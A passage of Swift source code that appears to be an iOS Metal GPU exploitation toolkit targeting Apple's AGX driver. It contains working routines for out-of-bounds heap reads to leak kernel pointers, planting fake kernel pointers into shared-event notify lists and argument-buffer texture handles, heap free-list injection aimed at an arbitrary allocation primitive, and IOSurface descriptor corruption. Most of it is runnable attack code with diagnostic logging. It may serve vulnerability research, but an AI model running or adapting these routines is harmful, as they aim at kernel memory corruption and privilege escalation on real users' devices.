        guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); completion(); return }
        step("── OOB Info Leak ─────────────────────────")

        // h0 (OOB src) + h1 (victim — read target)
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size  // 16384 bytes

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)

        // probe1 occupies h1[0..4095]
        guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
        let va1 = UInt(bitPattern: probe1.contents())
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
        step("✓ adjacent confirmed")

        // Raw byte dump of h1[0..511] — shows ALL non-zero bytes, not just qword-aligned
        func scanRawH1(label: String) {
            step("  -- \(label) [raw 512B] --")
            var anyNonZero = false
            var i = 0
            while i < 512 {
                // collect 16-byte row
                var row = [UInt8](repeating: 0, count: 16)
                var hasNZ = false
                for j in 0..<16 {
                    let byte = p0[actual + i + j]
                    row[j] = byte
                    if byte != 0 { hasNZ = true }
                }
                if hasNZ {
                    anyNonZero = true
                    let hex = row.map { String(format: "%02x", $0) }.joined(separator: " ")
                    step("  h1[+0x\(String(i, radix:16))] \(hex)")
                }
                i += 16
            }
            if !anyNonZero { step("  (all zero in first 512 bytes)") }
        }

        // Qword scan of all h1 — skip GPU pixel fill pattern and common noise
        func scanH1(label: String) {
            var found = 0
            step("  -- \(label) --")
            for qw in 0..<(actual / 8) {
                var val: UInt64 = 0
                for b in 0..<8 { val |= UInt64(p0[actual + qw*8 + b]) << (b*8) }
                guard val != 0 && val != 0xFFFFFFFFFFFFFFFF else { continue }
                // filter GPU shader pixel fill: RGBA(1,0,0,1) packed = 0xFF0000FFFF0000FF
                // and any repeating-4-byte pattern which is pure pixel data
                let lo32 = UInt32(val & 0xFFFFFFFF)
                let hi32 = UInt32(val >> 32)
                if lo32 == hi32 && lo32 != 0 { continue }  // repeating 4-byte = pixel
                let tag: String
                if val >= 0xFFFFFE0000000000 { tag = " *** KERNEL/FW PTR" }
                else if val >= 0x100000000   { tag = " (user/gpu va)" }
                else                          { tag = " (small val)" }
                step("  h1[+0x\(String(qw*8,radix:16))] = 0x\(String(val,radix:16))\(tag)")
                found += 1
                if found >= 80 { step("  ... truncated"); break }
            }
            if found == 0 { step("  (all zero / only pixel fill)") }
        }

        // Phase A: baseline before any texture — both raw and qword
        scanRawH1(label: "A: before alloc")
        scanH1(label: "A: before alloc (qword)")

        // 1×1 RGBA8 texture — only 4 bytes of pixel data, kills the noise
        // Any non-zero h1 values after makeTexture are driver descriptor bytes, not pixels
        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm,
                                                           width: 1, height: 1, mipmapped: false)
        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]
        guard let tex1 = h1.makeTexture(descriptor: td) else { step("tex1 nil"); completion(); return }
        let texAlign = device.heapTextureSizeAndAlign(descriptor: td)
        step("tex1 alloc: size=\(texAlign.size) align=\(texAlign.align) — 1×1 rgba8 shared")

        // Phase B: immediately after makeTexture — look for Metal driver descriptor writes
        scanRawH1(label: "B: after makeTexture")
        scanH1(label: "B: after makeTexture (qword)")

        // Submit compute pass — GPU writes ONE red pixel, minimal noise
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void probe(texture2d<float,access::read_write> t [[texture(0)]],
                          uint2 g [[thread_position_in_grid]]) {
            float4 v = t.read(g); t.write(v + float4(1,0,0,1), g);
        }
        """
        do {
            let lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
            guard let fn = lib.makeFunction(name: "probe") else { step("fn nil"); completion(); return }
            let pso = try device.makeComputePipelineState(function: fn)
            guard let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
            enc.setComputePipelineState(pso)
            enc.setTexture(tex1, index: 0)
            enc.dispatchThreadgroups(MTLSize(width:1,height:1,depth:1),
                                     threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
            enc.endEncoding()
            cmd.commit()
            // Phase C: during GPU execution
            scanRawH1(label: "C: during GPU")
            scanH1(label: "C: during GPU (qword)")
            cmd.waitUntilCompleted()
        } catch { step("PSO err: \(error.localizedDescription)"); completion(); return }

        // Phase D: after GPU completes — what persists?
        scanRawH1(label: "D: after GPU done")
        scanH1(label: "D: after GPU done (qword)")

        step("── OOB Info Leak complete ─────────────────")
        completion()
    }
}

// MTLSharedEvent signal-path corruption.
// MTLSharedEvent is backed by GPU-visible shared memory (signaledValue at known offset).
// Attack: interleave heap + event allocations so they land adjacent in GPU VA space.
// Detect adjacency by scanning OOB past the heap boundary for the event's sentinel value.
// Plant fake kernel pointers PAST signaledValue (into the notify-list / waiter region).
// GPU encodeSignalEvent → AGX firmware writes new value → Metal driver reads notify-list
// → if notify-list ptr is corrupted → kernel/driver dereferences fake kptr → kernel fault.
func runSharedEventCorrupt(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        let done = { step("── SharedEvent Corrupt complete ──────────"); completion() }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); done(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ no queue"); done(); return }
        step("── SharedEvent Signal Corruption ──────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared

        // Interleave heap + event so GPU allocator places them adjacent in VA space
        var heapBufs:  [MTLBuffer] = []
        var heapPtrs:  [UnsafeMutablePointer<UInt8>] = []
        var heapVas:   [UInt] = []
        var events:    [MTLSharedEvent] = []

        for i in 0..<8 {
            if let h = device.makeHeap(descriptor: hd) {
                let a = h.size
                if let b = h.makeBuffer(length: a, options: .storageModeShared) {
                    let p = b.contents().assumingMemoryBound(to: UInt8.self)
                    heapBufs.append(b); heapPtrs.append(p)
                    heapVas.append(UInt(bitPattern: p))
                }
            }
            if let ev = device.makeSharedEvent() {
                ev.signaledValue = 0xCAFEDEAD00000000 | UInt64(i)  // unique sentinel per event
                events.append(ev)
            }
        }
        step("sprayed \(heapBufs.count) heaps + \(events.count) events")
        guard !heapBufs.isEmpty else { step("no heaps"); done(); return }

        let actual = heapBufs[0].length

        // Find adjacent heap pair (sort by VA)
        let sortedI = (0..<heapVas.count).sorted { heapVas[$0] < heapVas[$1] }
        var srcI = -1
        for i in 0..<sortedI.count - 1 {
            let a = heapVas[sortedI[i]], b = heapVas[sortedI[i+1]]
            if b > a && b - a == UInt(actual) { srcI = sortedI[i]; break }
        }
        guard srcI >= 0 else { step("no adjacent heap pair — retry"); done(); return }

        let pSrc = heapPtrs[srcI]; let vaSrc = heapVas[srcI]
        step("OOB src heap va=0x\(String(vaSrc,radix:16))")

        // Scan OOB past src for event sentinel — ONLY within adjacent heap h_dst range.
        // Reading past the contiguous heap block hits unmapped CPU VA → SIGSEGV.
        // MTLSharedEvent backing is likely a separate IOKit VA pool; if not found here
        // we fall back to the unmodified signal round-trip test.
        let scanQwords = actual / 8   // exactly one heap width = 16384 bytes = safe
        step("scanning \(scanQwords*8) bytes (1 heap width) past src for event sentinel...")
        var evOffset = -1; var evIdx = -1
        for qw in 0..<scanQwords {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
            if val & 0xFFFFFFFF00000000 == 0xCAFEDEAD00000000 {
                evIdx = Int(val & 0xFF)
                evOffset = actual + qw*8
                step("  ★ event[\(evIdx)] sentinel at src[+\(evOffset)] (0x\(String(val,radix:16)))")
                break
            }
        }

        guard evOffset >= 0 && evIdx < events.count else {
            step("event backing not in heap VA region — events use separate allocator pool")
            step("Metal shared-event memory is not adjacent to heap allocations this run")
            // Fallback: at least confirm GPU→CPU event signaling works
            step("Running fallback: unmodified event signal round-trip test")
            guard let ev = events.first else { done(); return }
            ev.signaledValue = 0
            let lstn = MTLSharedEventListener(dispatchQueue: DispatchQueue.global())
            ev.notify(lstn, atValue: 1) { _, val in
                step("  ✓ event fired at val=\(val) — GPU→CPU signal path confirmed")
                done()
            }
            guard let cmd = queue.makeCommandBuffer() else { done(); return }
            cmd.encodeSignalEvent(ev, value: 1)
            cmd.commit()
            return
        }

        let ev = events[evIdx]
        step("event[\(evIdx)] backing at src[+\(evOffset)] — signaledValue confirmed")

        // Plant fake kptrs at event[+8..+31] — region past signaledValue
        // This is where the notify-list / waiter-list pointer lives
        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]
        for off in stride(from: 8, to: 32, by: 8) {
            for b in 0..<8 { pSrc[evOffset + off + b] = kptr[b] }
        }
        step("planted kptr 0xFFFFFFF000000008 at event[+8..+31]")

        // Register listener — driver reads notify-list when event fires
        let lstn = MTLSharedEventListener(dispatchQueue: DispatchQueue.global())
        sl.write("SHARED EVENT SIGNAL — registering listener + GPU signal with corrupted notify-list")
        ev.notify(lstn, atValue: ev.signaledValue + 1) { _, val in
            step("  listener fired at val=\(val) — kernel walked corrupted notify list")
            done()
        }

        // GPU signals the event → AGX firmware writes new value → driver processes notify list
        guard let cmd = queue.makeCommandBuffer() else { step("cmd nil"); done(); return }
        cmd.encodeSignalEvent(ev, value: ev.signaledValue + 1)
        cmd.addCompletedHandler { cb in
            if cb.status == .error {
                step("  *** cmd ERROR: \(cb.error?.localizedDescription ?? "none")")
                step("  *** command buffer rejected — signal path blocked")
                done()
            }
        }
        cmd.commit()

        // 6s timeout — if driver faulted silently without firing listener
        DispatchQueue.global().asyncAfter(deadline: .now() + 6) {
            step("  6s timeout — listener did not fire (driver may have faulted or discarded)")
            done()
        }
    }
}

// Argument buffer Tier-2 type confusion.
// Metal argument buffers encode GPU resource handles (buffer VA, texture descriptor index).
// OOB-write a fake kernel pointer into the texture handle slot of an argument buffer.
// Submit a compute dispatch whose shader reads from that argument buffer.
// Goal: does the kernel validate the encoded texture handle during submit (kernel fault)?
//       or does the GPU shader fault during execution (GPU error)?
// A16 supports Tier 2 argument buffers. Texture handle is a 64-bit index into the
// driver-managed texture descriptor heap. Corrupting it → either graceful GPU error
// or kernel dereference of our fake handle during residency/validation tracking.
func runArgBufTypeConfusion(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No cmd queue"); completion(); return }
        step("── ArgBuf Type Confusion ──────────────────")
        step("  arg buffer tier: \(device.argumentBuffersSupport.rawValue)")  // 2 = Tier2

        // Build argument encoder: slot 0 = buffer ptr, slot 1 = 2D texture
        let bufDesc = MTLArgumentDescriptor()
        bufDesc.index = 0; bufDesc.dataType = .pointer; bufDesc.access = .readOnly

        let texDesc2 = MTLArgumentDescriptor()
        texDesc2.index = 1; texDesc2.dataType = .texture
        texDesc2.textureType = .type2D; texDesc2.access = .readOnly

        guard let argEnc = device.makeArgumentEncoder(arguments: [bufDesc, texDesc2]) else {
            step("✗ makeArgumentEncoder nil"); completion(); return
        }
        let encLen = argEnc.encodedLength
        step("  encodedLength=\(encLen) bytes")

        // ── Adjacent h0 (OOB src) + h1 (victim) ──────────────────────────
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size  // 16384

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)

        // Small probe in h1 to get its base VA (occupies h1[0..4095])
        guard let probe1 = h1.makeBuffer(length: 64, options: .storageModeShared) else { step("probe1 nil"); completion(); return }
        let va1 = UInt(bitPattern: probe1.contents())
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("  va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent"); completion(); return }
        step("  ✓ adjacent")

        // Argument buffer in h1 at h1[4096] (probe occupies h1[0..4095])
        let argBufLen = max(encLen, 256)
        guard let argBuf = h1.makeBuffer(length: argBufLen, options: .storageModeShared) else {
            step("✗ argBuf nil — h1 no space"); completion(); return
        }
        let pArg = argBuf.contents().assumingMemoryBound(to: UInt8.self)
        let vaArg = UInt(bitPattern: pArg)
        // argBuf should be at h1[4096] = va1 + 4096
        step("  argBuf at 0x\(String(vaArg,radix:16)) (expect 0x\(String(va1+4096,radix:16)))")

        // ── Encode legit resources, scan for handle layout ─────────────────
        guard let legitBuf = device.makeBuffer(length: 256, options: .storageModeShared) else { step("legitBuf nil"); completion(); return }
        let td2 = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 8, height: 8, mipmapped: false)
        td2.storageMode = .shared; td2.usage = .shaderRead
        guard let legitTex = device.makeTexture(descriptor: td2) else { step("legitTex nil"); completion(); return }

        // Sentinel-fill, then encode
        for i in 0..<argBufLen { pArg[i] = 0x55 }
        argEnc.setArgumentBuffer(argBuf, offset: 0)
        argEnc.setBuffer(legitBuf, offset: 0, index: 0)
        argEnc.setTexture(legitTex, index: 1)

        // Scan encoded bytes: find texture handle offset (non-0x55 at higher offset)
        step("  encoded argBuf layout:")
        var bufHandleOff = -1; var texHandleOff = -1
        for qw in 0..<(argBufLen/8) {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(pArg[qw*8+b]) << (b*8) }
            if val != 0x5555555555555555 {
                step("    argBuf[+\(qw*8)]=0x\(String(val,radix:16))")
                if bufHandleOff < 0 { bufHandleOff = qw*8 }
                else if texHandleOff < 0 { texHandleOff = qw*8 }
            }
        }
        // Fallback: split encoded length in half
        if bufHandleOff < 0 { bufHandleOff = 0 }
        if texHandleOff < 0 { texHandleOff = encLen/2 }
        step("  buf handle @ argBuf[+\(bufHandleOff)], tex handle @ argBuf[+\(texHandleOff)]")

        // ── OOB-overwrite texture handle with fake kptr ────────────────────
        // argBuf is at h1[4096], so argBuf[texHandleOff] = h1[4096+texHandleOff]
        // OOB from h0: p0[actual + 4096 + texHandleOff] = h1[4096 + texHandleOff] ✓
        let oobOff = 4096 + texHandleOff
        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]  // 0xFFFFFFF000000008 LE

        // Also corrupt the slot BEFORE the texture handle (type tag / stride field)
        if texHandleOff >= 8 {
            for b in 0..<8 { p0[actual + 4096 + texHandleOff - 8 + b] = kptr[b] }
        }
        for b in 0..<8 { p0[actual + oobOff + b] = kptr[b] }
        // And 8 bytes after (metadata trailing the handle)
        for b in 0..<8 { p0[actual + oobOff + 8 + b] = kptr[b] }

        // Verify via pArg
        var rb: UInt64 = 0
        for b in 0..<8 { rb |= UInt64(pArg[texHandleOff+b]) << (b*8) }
        step("  argBuf[+\(texHandleOff)] after OOB: 0x\(String(rb,radix:16)) (expect 0xFFFFFFF000000008)")

        // ── Build PSO: shader that reads from argument buffer ──────────────
        // Shader reads through the argument buffer so GPU actually dereferences the handles
        let shaderSrc = """
        #include <metal_stdlib>
        using namespace metal;
        struct MyArgs {
            device uint8_t* buf;
            texture2d<float, access::read> tex;
        };
        kernel void argtest(device MyArgs& args [[buffer(0)]],
                            uint pos [[thread_position_in_grid]]) {
            volatile uint8_t x = args.buf[0];
            volatile float4 y = args.tex.read(uint2(0,0));
            (void)x; (void)y;
        }
        """
        let lib: MTLLibrary; let pso: MTLComputePipelineState
        do {
            lib = try device.makeLibrary(source: shaderSrc, options: MTLCompileOptions())
            guard let fn = lib.makeFunction(name: "argtest") else { step("fn nil"); completion(); return }
            pso = try device.makeComputePipelineState(function: fn)
        } catch { step("✗ compile: \(error.localizedDescription)"); completion(); return }
        step("  PSO compiled")

        // ── Submit: shader reads corrupt argument buffer ───────────────────
        guard let cmd = queue.makeCommandBuffer(),
              let enc = cmd.makeComputeCommandEncoder() else { step("cmd nil"); completion(); return }
        enc.setComputePipelineState(pso)
        enc.setBuffer(argBuf, offset: 0, index: 0)
        enc.useResource(argBuf, usage: .read)
        enc.useResource(legitBuf, usage: .read)   // legit buf still resident
        // Note: legitTex NOT explicitly made resident — forces kernel to track via argBuf
        enc.dispatchThreadgroups(MTLSize(width:1,height:1,depth:1),
                                 threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
        enc.endEncoding()

        sl.write("ARGBUF TYPE CONFUSION — committing. tex handle corrupted to 0xFFFFFFF000000008")
        cmd.addCompletedHandler { cb in
            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
            switch s {
            case .completed:
                step("  COMPLETED — GPU ran with corrupted tex handle (no kernel validation)")
            case .error:
                step("  *** ERROR — GPU/kernel faulted on corrupted tex handle")
                step("  *** error: \(e)")
                step("  *** — check if this is GPU shader fault or kernel validation fault")
            default:
                step("  status=\(s.rawValue) err=\(e)")
            }
            step("── ArgBuf Type Confusion complete ───────────")
            completion()
        }
        cmd.commit()
    }
}

// Heap free-list injection via purgeable-state free.
// When a suballoc'd buffer is freed via setPurgeableState(.empty), the Metal heap allocator
// writes a free-list node into that buffer's former GPU-visible shared memory.
// Attack: OOB-write a fake next-pointer into that node before the next makeBuffer() call.
// If the allocator follows our pointer, the returned buffer's .contents() == our target address.
// A16 Bionic / AGX G14 — confirmed free-list IS in shared mem (ptr-class:4 seen previously).
func runHeapFreeListInject(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Seg-Descriptor Inject ─────────────")

        // Step 1: SPRAY 12 heaps, sort by VA, find confirmed adjacent pair.
        // Two consecutive heaps with dist == actual are guaranteed contiguous.
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        var heaps:  [MTLHeap]   = []
        var bufs:   [MTLBuffer] = []
        var ptrs:   [UnsafeMutablePointer<UInt8>] = []
        var vas:    [UInt]      = []

        for _ in 0..<12 {
            guard let h = device.makeHeap(descriptor: hd) else { continue }
            let actual = h.size
            guard let b = h.makeBuffer(length: actual, options: .storageModeShared) else { continue }
            let p = b.contents().assumingMemoryBound(to: UInt8.self)
            heaps.append(h); bufs.append(b); ptrs.append(p); vas.append(UInt(bitPattern: p))
        }
        step("sprayed \(heaps.count) heaps")

        let actual = heaps.isEmpty ? 16384 : heaps[0].size
        // Sort by VA, find adjacent pair
        let sorted = (0..<heaps.count).sorted { vas[$0] < vas[$1] }
        var srcI = -1, dstI = -1
        for i in 0..<sorted.count - 1 {
            let a = vas[sorted[i]], b = vas[sorted[i+1]]
            if b > a && b - a == UInt(actual) { srcI = sorted[i]; dstI = sorted[i+1]; break }
        }
        guard srcI >= 0 else { step("✗ no adjacent pair in spray — very unusual"); completion(); return }

        let pSrc = ptrs[srcI]
        let hDst = heaps[dstI]
        let vaSrc = vas[srcI]; let vaDst = vas[dstI]
        step("✓ adjacent pair: src=0x\(String(vaSrc,radix:16)) dst=0x\(String(vaDst,radix:16)) dist=0x\(String(actual,radix:16))")

        // Step 2: verify cross-heap read — dst heap was fully allocated in spray
        // read first byte of dst via src OOB
        let firstByte = pSrc[actual]
        step("  cross-heap read: dst[0]=0x\(String(firstByte,radix:16)) ✓")

        // Step 3: scan dst[0..255] BEFORE planting — see raw segment descriptor bytes.
        // The allocator reads from dst's GPU-visible backing to compute buffer base.
        // Formula observed previously: returned_va = stored_val - actual
        step("dst[0..127] raw (from src OOB):")
        var rawVals: [(Int,UInt64)] = []
        for qw in 0..<16 {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
            if val != 0 { rawVals.append((qw*8, val)) }
        }
        for (off, val) in rawVals { step("  dst[+\(off)]=0x\(String(val,radix:16))") }
        if rawVals.isEmpty { step("  dst[0..127] all zero — fresh heap") }

        // Step 4: the dst heap is currently FULL (we allocated actual bytes in spray).
        // We need an empty dst heap to call makeBuffer on.
        // Alloc a FRESH dst2 heap adjacent to our src by leveraging the layout:
        // heaps in the spray are sorted — dst is at vaSrc+actual. We need a heap
        // whose GPU-backing starts AFTER dst. Use dst heap directly but free its buffer.
        // setPurgeableState(.empty) returns the block to the allocator.
        // The key: we read the segment descriptor BEFORE the free, then plant AFTER.
        let dstBuf = bufs[dstI]
        let pDst = ptrs[dstI]

        // Fill dst with 0xBB so we can spot allocator-written metadata after free
        for i in 0..<actual { pDst[i] = 0xBB }
        step("dst filled 0xBB")

        // Free the dst buffer — allocator may write free-node to GPU-visible mem
        let _ = dstBuf.setPurgeableState(.empty)
        step("dst buf freed")

        // Step 5: scan dst[0..255] via src OOB for changed bytes
        step("dst[0..255] after free (via src OOB):")
        var segOffset = -1
        var segVal: UInt64 = 0
        for qw in 0..<32 {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(pSrc[actual + qw*8 + b]) << (b*8) }
            if val != 0xBBBBBBBBBBBBBBBB && val != 0 {
                step("  dst[+\(qw*8)]=0x\(String(val,radix:16)) ← non-sentinel")
                if segOffset < 0 { segOffset = qw*8; segVal = val }
            }
        }

        // Step 6: plant segment descriptor regardless of whether we found one.
        // Formula: returned = planted - actual. Target = vaDst (the heap's own start).
        // plant = vaDst + actual → returned should be vaDst.
        // Use offset 0 if no specific offset found (default seg descriptor location).
        let plantOffset = segOffset >= 0 ? segOffset : 0
        let target: UInt = vaDst   // expect allocator to return vaDst
        let plantVal: UInt64 = UInt64(target + UInt(actual))
        step("planting at dst[+\(plantOffset)]: 0x\(String(plantVal,radix:16)) → expect return 0x\(String(target,radix:16))")
        for b in 0..<8 { pSrc[actual + plantOffset + b] = UInt8((plantVal >> (b*8)) & 0xFF) }

        // Step 7: alloc from dst heap — should follow our planted descriptor
        guard let bNew = hDst.makeBuffer(length: 256, options: .storageModeShared) else {
            step("✗ hDst.makeBuffer nil — heap rejected (freed buffer gone from heap?)")
            // Try alloc anyway with a new heap that shares the same GPU VA range
            step("  dst heap exhausted or invalidated after free")
            completion(); return
        }
        let retPtr = UInt(bitPattern: bNew.contents())
        step("makeBuffer returned: 0x\(String(retPtr,radix:16))")

        // Step 8: evaluate
        if retPtr == target {
            step("★★★ EXACT HIT — returned == target (vaDst)")
            step("★★★ ARBITRARY ALLOCATION PRIMITIVE CONFIRMED ★★★")
        } else {
            let delta = retPtr > target ? retPtr - target : target - retPtr
            let inRange = retPtr >= vaDst && retPtr < vaDst + UInt(actual)
            if inRange {
                step("~ in dst range, delta=0x\(String(delta,radix:16)) from target")
                // Calibrate: actual formula offset
                let impliedPlant = UInt64(retPtr) + UInt64(actual)
                step("  implied: allocator used val=0x\(String(impliedPlant,radix:16)) (not our plant)")
                step("  → formula offset = 0x\(String(delta,radix:16)), adjust plant next run")
            } else {
                step("✗ returned outside dst range — allocator not reading our field")
            }
        }

        step("── Heap Seg-Descriptor Inject complete ──────")
        completion()
    }
}

// Precision corruption: valid dispatch + kernel-ptr poison + IOSurface texture corruption.
// Phase 1: write valid 1x1x1 grid at h1[0..11], poison h1[12..] with fake kernel ptrs.
//   If AGX reads past byte 12 → kernel ptr dereference → fault (not a timeout).
// Phase 2: create IOSurface-backed MTLTexture in h1, corrupt its descriptor bytes via h0 OOB,
//   blit from it — kernel validates IOSurface ref during submit → may follow corrupted ptr.
func runPrecisionCorruption(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── Precision Corruption ──────────────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0); let va1 = UInt(bitPattern: p1)
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }

        // Sentinel check
        for i in 0..<actual { p1[i] = 0xAA }
        guard p0[actual] == 0xAA else { step("✗ sentinel miss"); completion(); return }
        step("✓ adjacent + cross-heap read confirmed")

        // ── Phase 1: precision indirect dispatch ──────────────────────────
        step("── Phase 1: precision indirect dispatch ──")
        // Valid 1×1×1 at bytes 0..11
        let validGrid: [UInt8] = [
            1,0,0,0,  // threadgroupsX = 1
            1,0,0,0,  // threadgroupsY = 1
            1,0,0,0   // threadgroupsZ = 1
        ]
        for i in 0..<12 { p0[actual + i] = validGrid[i] }
        // Fake kernel ptrs at bytes 12..63 — looks like FFFFFFXXXXXXXXXX range
        // AGX kernel driver runs on ARM64, kernel VA is 0xFFFFFFF0_0xxxxxxx
        let kptr: [UInt8] = [0x08,0x00,0x00,0x00,0xF0,0xFF,0xFF,0xFF]  // LE: 0xFFFFFFF000000008
        for off in stride(from: 12, to: 64, by: 8) {
            for b in 0..<8 { p0[actual + off + b] = kptr[b] }
        }
        step("  h1[0..11]=valid(1,1,1) h1[12..63]=0xFFFFFFF000000008 fake kptr")

        // Verify via p1
        var gx: UInt32 = 0
        for b in 0..<4 { gx |= UInt32(p1[b]) << (b*8) }
        step("  readback gx=\(gx) (expect 1)")

        // Build compute PSO
        let src = "#include <metal_stdlib>\nusing namespace metal;\nkernel void noop(uint id [[thread_position_in_grid]]) {}"
        let lib: MTLLibrary; let pso: MTLComputePipelineState
        do {
            lib = try device.makeLibrary(source: src, options: MTLCompileOptions())
            guard let fn = lib.makeFunction(name: "noop") else { step("fn nil"); completion(); return }
            pso = try device.makeComputePipelineState(function: fn)
        } catch { step("✗ compile: \(error.localizedDescription)"); completion(); return }
        step("  noop PSO compiled")

        guard let cmd1 = queue.makeCommandBuffer(),
              let enc1 = cmd1.makeComputeCommandEncoder() else { step("cmd1 nil"); completion(); return }
        enc1.setComputePipelineState(pso)
        enc1.dispatchThreadgroups(indirectBuffer: b1, indirectBufferOffset: 0,
                                   threadsPerThreadgroup: MTLSize(width:1,height:1,depth:1))
        enc1.endEncoding()

        sl.write("PRECISION DISPATCH — about to commit (valid 1x1x1 + kptr poison at 12..63)")
        cmd1.addCompletedHandler { cb in
            let s = cb.status; let e = cb.error?.localizedDescription ?? "none"
            if s == .completed {
                step("  Phase1 COMPLETED — AGX only reads 12 bytes of indirect buf (kptr poison ignored)")
            } else if s == .error {
                step("  *** Phase1 ERROR — AGX faulted on kptr at bytes 12+: \(e)")
                step("  *** Kernel dereference of fake ptr — KERNEL MEMORY ACCESS")
            } else { step("  Phase1 status=\(s.rawValue) err=\(e)") }
        }
        cmd1.commit()
        cmd1.waitUntilCompleted()

        // ── Phase 2: IOSurface-backed texture corruption ──────────────────
        step("── Phase 2: IOSurface texture descriptor corruption ──")
        let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared; hd2.hazardTrackingMode = .untracked
        guard let hA = device.makeHeap(descriptor: hd2),
              let hB = device.makeHeap(descriptor: hd2) else { step("hA/hB nil"); completion(); return }
        let actB = hA.size  // = 16384
        guard let bA = hA.makeBuffer(length: actB, options: [.storageModeShared, .hazardTrackingModeUntracked]) else { step("bA nil"); completion(); return }
        let pA = bA.contents().assumingMemoryBound(to: UInt8.self)
        let vaA = UInt(bitPattern: pA)

        // Probe hB base VA FIRST — probeB occupies hB[0..4095] (Metal min alloc = 4096)
        guard let probeB = hB.makeBuffer(length: 64, options: [.storageModeShared, .hazardTrackingModeUntracked]) else { step("probeB nil"); completion(); return }
        let vaB = UInt(bitPattern: probeB.contents())
        let distAB = vaB > vaA ? vaB - vaA : vaA - vaB
        step("  vaA=0x\(String(vaA,radix:16)) vaBprobe=0x\(String(vaB,radix:16)) dist=0x\(String(distAB,radix:16))")
        guard distAB == UInt(actB) else { step("  hA/hB not adjacent — phase2 skip"); completion(); return }
        step("  ✓ adjacent — hB[0] at 0x\(String(vaB,radix:16)) probeB fills hB[0..4095]")

        // Texture goes at hB[4096] (probeB consumed hB[0..4095])
        // 32×32 RGBA8 = 4096 bytes → fits in remaining 12288 bytes
        let td = MTLTextureDescriptor.texture2DDescriptor(pixelFormat: .rgba8Unorm, width: 32, height: 32, mipmapped: false)
        td.storageMode = .shared; td.usage = [.shaderRead, .shaderWrite]; td.hazardTrackingMode = .untracked
        guard let texB = hB.makeTexture(descriptor: td) else { step("texB nil — hB no space"); completion(); return }
